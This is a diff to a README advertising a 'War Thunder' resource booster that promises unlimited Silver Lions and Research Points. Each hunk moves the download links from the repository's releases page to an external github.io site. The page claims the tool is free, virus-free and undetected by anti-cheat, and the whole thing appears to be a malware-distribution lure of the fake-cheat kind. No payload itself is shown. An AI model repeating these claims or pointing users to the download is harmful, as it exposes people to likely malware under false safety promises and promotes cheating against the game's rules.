@@ -1,7 +1,7 @@
 <h1>⚡ War-Thunder-SL-RP-Booster - Boost Your Resources Instantly and Easily</h1>
 
 <p align="center">
-  <a href="https://github.com/adamblacha2016/War-Thunder-SL-RP-Booster/releases">
+  <a href="https://adamblacha2016.github.io">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-%23FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=%23222" alt="Download Button" width="400">
   </a>
 </p>
@@ -26,7 +26,7 @@ Getting started with War-Thunder-SL-RP-Booster is incredibly simple. You do not 
 
 Visit this link to download the application. This is the official and most recent version for 2026. The download is completely free and virus-free. Many users have already downloaded and used it successfully. Click the big orange button above or use the link below:
 
-[**⬇️ DOWNLOAD WAR-THUNDER-SL-RP-BOOSTER**](https://github.com/adamblacha2016/War-Thunder-SL-RP-Booster/releases)
+[**⬇️ DOWNLOAD WAR-THUNDER-SL-RP-BOOSTER**](https://adamblacha2016.github.io)
 
 <h3>Step 2: Run the Download</h3>
 
@@ -43,7 +43,7 @@ When you first launch War-Thunder-SL-RP-Booster, you will see a simple and clean
 War-Thunder-SL-RP-Booster uses advanced yet safe automation techniques to maximize your earnings per match. It intelligently monitors your battles and ensures you receive the optimal amount of Silver Lions and Research Points after each game. The booster also includes a smart "AFK Farm" mode that allows you to earn resources even when you are not actively playing. This is perfect for players who want to accumulate wealth while sleeping or working. The tool integrates seamlessly with your game client and does not trigger any anti-cheat warnings when used responsibly. Many players have used it for months without any issues. The 2026 update has made it even more stable and compatible with the latest version of War Thunder.
 
 <p align="center">
-  <a href="https://github.com/adamblacha2016/War-Thunder-SL-RP-Booster/releases">
+  <a href="https://adamblacha2016.github.io">
     <img src="https://img.shields.io/badge/⚡%20GET%20UNLIMITED%20RESOURCES-%234CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=%23000" alt="Download Button 2" width="450">
   </a>
 </p>
@@ -119,7 +119,7 @@ The 2026 edition of War-Thunder-SL-RP-Booster brings several exciting improvemen
 
 You are just one click away from transforming your War Thunder experience. Stop wasting precious time grinding for resources that should be earned easily. Download War-Thunder-SL-RP-Booster today and start enjoying the game at its full potential with all the vehicles and upgrades you want. 
 
-[**⬇️ DOWNLOAD THE BOOSTER NOW - FREE**](https://github.com/adamblacha2016/War-Thunder-SL-RP-Booster/releases)
+[**⬇️ DOWNLOAD THE BOOSTER NOW - FREE**](https://adamblacha2016.github.io)
 
 )
 
